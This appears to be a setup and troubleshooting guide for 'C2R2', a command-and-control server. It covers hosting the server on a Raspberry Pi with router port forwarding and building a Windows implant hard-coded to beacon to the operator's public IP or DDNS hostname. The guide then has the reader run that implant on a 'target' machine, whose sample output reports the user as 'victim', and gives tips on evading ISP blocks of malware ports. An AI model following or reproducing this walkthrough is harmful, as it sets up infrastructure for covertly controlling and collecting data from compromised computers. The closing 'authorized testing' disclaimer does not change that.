# Raspberry Pi C2 Server Setup Guide

##  Quick Start: Raspberry Pi with Port Forwarding

This guide walks you through setting up C2R2 server on a Raspberry Pi accessible from the internet via port forwarding.

---

##  Problem: "El agente no alcanza el servidor con port forward"

If you're experiencing this issue, the most common causes are:

1.  **Server not binding to all interfaces** - Server only listening on localhost
2.  **Port forwarding misconfigured** - Wrong internal IP or port mismatch
3.  **Firewall blocking connections** - UFW/iptables blocking port 4444
4.  **Agent built with wrong IP** - Agent configured with LAN IP instead of public IP
5.  **CGNAT issue** - ISP using Carrier-Grade NAT

---

##  Step-by-Step Setup

### Step 1: Prepare Raspberry Pi

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y curl netcat-openbsd net-tools

# Get your Raspberry Pi's LAN IP
ip addr show | grep "inet " | grep -v 127.0.0.1
# Example output: inet 192.168.1.100/24
```

### Step 2: Open Firewall Port

```bash
# Allow port 4444 through firewall
sudo ufw allow 4444/tcp

# If UFW is not active, enable it
sudo ufw enable

# Verify rule was added
sudo ufw status
```

Expected output:
```
Status: active

To                         Action      From
--                         ------      ----
4444/tcp                   ALLOW       Anywhere
```

### Step 3: Configure Router Port Forwarding

1. **Find your router's IP** (usually 192.168.1.1 or 192.168.0.1)
   ```bash
   ip route | grep default
   ```

2. **Access router admin panel**
   - Open browser: http://192.168.1.1
   - Login with admin credentials

3. **Create port forwarding rule**
   ```
   Service Name: C2R2-Server
   External Port: 4444
   Internal IP: 192.168.1.100  (your Raspberry Pi IP)
   Internal Port: 4444
   Protocol: TCP
   Status: Enabled
   ```

4. **Save configuration**

### Step 4: Find Your Public IP

```bash
# Method 1
curl ifconfig.me

# Method 2
curl icanhazip.com

# Method 3
curl api.ipify.org
```

Note down this IP (example: 203.0.113.50)

### Step 5: Build and Start Server

```bash
cd ~/C2R2-v2/c2r2-server

# Build server
cargo build --release

# Start server binding to ALL interfaces (not just localhost!)
./target/release/c2r2-server --bind 0.0.0.0 --port 4444 --verbose
```

**CRITICAL**: Use `--bind 0.0.0.0`, NOT `--bind 127.0.0.1` or `--bind localhost`!

Expected output:
```
╔═══════════════════════════════════════════════════════════╗
║          C2R2 - Command & Control Server v2.0            ║
║              Direct Connection - No Shellcode            ║
╚═══════════════════════════════════════════════════════════╝

 Listening: 0.0.0.0:4444
 Help: /help
 Logs: logs/
```

### Step 6: Verify Server is Listening

Open a new terminal on the Raspberry Pi:

```bash
# Check server is listening on all interfaces (0.0.0.0)
sudo netstat -tlnp | grep 4444
```

Expected output:
```
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      12345/c2r2-server
```

**NOT**: `127.0.0.1:4444`

If you see `127.0.0.1:4444`, the server is only accepting local connections. Restart with `--bind 0.0.0.0`.

### Step 7: Test Port Forwarding

**From the Raspberry Pi itself** (local test):
```bash
nc -zv localhost 4444
# Expected: Connection to localhost 4444 port [tcp/*] succeeded!
```

**From another device on your LAN** (LAN test):
```bash
nc -zv 192.168.1.100 4444
# Replace 192.168.1.100 with your Raspberry Pi's IP
# Expected: Connection succeeded!
```

**From the internet** (WAN test - use your phone's mobile data or another external network):
```bash
nc -zv 203.0.113.50 4444
# Replace with YOUR public IP from Step 4
# Expected: Connection succeeded!
```

**Or use an online port checker**:
- Visit: https://www.yougetsignal.com/tools/open-ports/
- Enter your public IP: 203.0.113.50
- Enter port: 4444
- Click "Check"
- Should show: "Port 4444 is open"

### Step 8: Build Agent with Public IP

On your Kali/build machine:

```bash
cd ~/C2R2-v2/builder

# Build agent with YOUR public IP (not Raspberry Pi's LAN IP!)
cargo run --release -- build-agent \
  --name my-agent \
  --server "203.0.113.50:4444" \
  --production
```

** IMPORTANT**: Use your **PUBLIC IP** (203.0.113.50), NOT your Raspberry Pi's LAN IP (192.168.1.100)!

### Step 9: Deploy and Test Agent

1. Transfer `my-agent.exe` to target Windows machine
2. Execute the agent
3. On Raspberry Pi server console, you should see:

```
 Nuevo cliente [1] desde <target-ip>:xxxxx
 [1] SYSINFO hostname: TARGET-PC
 [1] SYSINFO username: victim
 [1] SYSINFO OS: Windows 10 Pro
 [1] SYSINFO privileges: User
```

---

##  Troubleshooting

### Issue 1: Port Test Fails from Internet

**Symptom**: `nc -zv <public-ip> 4444` fails from external network

**Solutions**:

1. **Verify port forwarding in router**
   - Log back into router
   - Confirm rule is enabled
   - Confirm internal IP matches Raspberry Pi
   - Try recreating the rule

2. **Check if ISP blocks port 4444**
   ```bash
   # Some ISPs block common malware ports
   # Try a different port like 8443
   ./c2r2-server --bind 0.0.0.0 --port 8443

   # Update router port forwarding to 8443
   # Rebuild agent with new port:
   cargo run --release -- build-agent \
     --name my-agent-8443 \
     --server "203.0.113.50:8443" \
     --production
   ```

3. **Check if behind CGNAT**
   ```bash
   # Get your router's WAN IP (from router admin panel)
   # Compare with public IP from curl ifconfig.me
   # If different, you're behind CGNAT

   # Solution: Contact ISP or use ngrok/VPN tunnel
   ```

### Issue 2: Server Shows 127.0.0.1:4444

**Symptom**: `netstat` shows server listening on `127.0.0.1:4444` instead of `0.0.0.0:4444`

**Solution**:
```bash
# Kill the server (Ctrl+C)
# Restart with correct bind address:
./target/release/c2r2-server --bind 0.0.0.0 --port 4444
```

### Issue 3: Agent Connects but Immediately Disconnects

**Symptom**: Server shows connection for 1 second then disconnects

**Solutions**:

1. **Check agent was built with correct IP**
   ```bash
   strings my-agent.exe | grep -A 2 "C2_SERVER"
   # Should show your public IP, not 127.0.0.1
   ```

2. **Firewall blocking return traffic**
   ```bash
   # On Raspberry Pi, allow all established connections
   sudo ufw allow out 4444/tcp
   ```

3. **NAT timeout too aggressive**
   ```bash
   # On C2 server, configure faster beacon:
   C2R2 [1]> /beacon 30:20
   ```

### Issue 4: UFW Blocking Connections

**Symptom**: Port test works from LAN but fails from WAN

**Solution**:
```bash
# Check UFW rules
sudo ufw status verbose

# If 4444 not listed, add it:
sudo ufw allow 4444/tcp

# Reload UFW
sudo ufw reload

# Verify rule was added
sudo ufw status numbered
```

---

##  Configuration Verification Checklist

Before troubleshooting, verify each item:

**Raspberry Pi Configuration**:
- [ ] Server running with `--bind 0.0.0.0` (not localhost)
- [ ] `netstat` shows `0.0.0.0:4444` (not `127.0.0.1:4444`)
- [ ] UFW allows port 4444: `sudo ufw status | grep 4444`
- [ ] Server accessible from LAN: `nc -zv 192.168.1.100 4444`

**Router Configuration**:
- [ ] Port forwarding rule created
- [ ] External port: 4444
- [ ] Internal IP: matches Raspberry Pi LAN IP
- [ ] Internal port: 4444
- [ ] Protocol: TCP
- [ ] Rule is enabled/active

**External Connectivity**:
- [ ] Public IP known: `curl ifconfig.me`
- [ ] Port test succeeds from internet: `nc -zv <public-ip> 4444`
- [ ] Not behind CGNAT

**Agent Configuration**:
- [ ] Agent built with PUBLIC IP (not LAN IP)
- [ ] Agent built in production mode (`--production`)
- [ ] Server address format: `IP:PORT` (e.g., "203.0.113.50:4444")

---

##  Understanding the Connection Flow

```
┌──────────────┐
│ Agent (WAN)  │  Windows target on internet
└──────┬───────┘
       │ 1. Connect to public IP:4444
       ▼
┌──────────────┐
│   Internet   │  Public network
└──────┬───────┘
       │ 2. Routes to your public IP
       ▼
┌──────────────┐
│    Router    │  Port forwarding: 4444 → 192.168.1.100:4444
└──────┬───────┘
       │ 3. Forwards to Raspberry Pi
       ▼
┌──────────────┐
│ Raspberry Pi │  Server at 192.168.1.100:4444
│  (0.0.0.0)   │  Listening on all interfaces
└──────────────┘
```

**Key Points**:
1. Agent must be built with **public IP** (203.0.113.50)
2. Router forwards **public:4444** → **LAN:4444**
3. Server listens on **0.0.0.0:4444** (all interfaces)

---

##  Security Reminders

1. **Production Mode**: Always use `--production` for real deployments
2. **Change Default Port**: Don't use 4444 in production
3. **Monitor Logs**: Check `logs/c2r2-session.log` regularly
4. **Strong Passwords**: Secure your Raspberry Pi with strong SSH password
5. **SSH Key Auth**: Disable password auth, use keys only
6. **Firewall**: Only open necessary ports

```bash
# Example: Better security configuration
./c2r2-server --bind 0.0.0.0 --port 8443
sudo ufw default deny incoming
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 8443/tcp  # C2
sudo ufw enable
```

---

##  Alternative: Use DDNS if Public IP Changes

If your ISP assigns dynamic IPs:

```bash
# Install ddclient on Raspberry Pi
sudo apt install ddclient

# Configure for No-IP or DuckDNS
sudo nano /etc/ddclient.conf

# Use hostname instead of IP when building agent:
cargo run --release -- build-agent \
  --name my-agent \
  --server "myc2.ddns.net:4444" \
  --production
```

See the [troubleshooting documentation](../troubleshooting/) for detailed DDNS setup.

---

##  Still Having Issues?

1. **Enable verbose mode**:
   ```bash
   ./c2r2-server --bind 0.0.0.0 --port 4444 --verbose
   ```

2. **Check logs**:
   ```bash
   tail -f logs/c2r2-session.log
   ```

3. **Test with netcat**:
   ```bash
   # On Raspberry Pi, start simple TCP server
   nc -l -p 4444

   # From internet, connect
   nc <public-ip> 4444

   # Type messages to test bidirectional communication
   ```

4. **Verify agent can reach server**:
   ```bash
   # On Windows target (before deploying agent)
   Test-NetConnection -ComputerName 203.0.113.50 -Port 4444
   ```

5. **Review documentation**:
   - [Troubleshooting documentation](../troubleshooting/)
   - [Quick reference](../testing/QUICK_REFERENCE.md)

---

**Author**: C2R2 Team
**Date**: November 2024
**For**: Educational and authorized testing purposes only
